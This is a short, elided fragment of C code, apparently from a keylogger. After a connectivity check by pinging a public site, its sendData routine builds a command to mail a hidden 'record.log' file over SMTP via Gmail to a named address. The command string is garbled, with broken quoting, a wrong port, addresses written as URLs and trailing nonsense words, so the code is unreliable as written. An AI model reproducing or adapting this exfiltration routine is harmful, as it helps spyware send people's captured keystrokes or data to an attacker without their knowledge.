...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.redhat.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:192 -v --mail-from \"https://fadliwiryawirawan@google.com.sg" --mail-rcpt \" https://fadliwiryawirawan@google.com.sg" --ssl -u    https://fadliwiryawirawan@google.com.sg :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
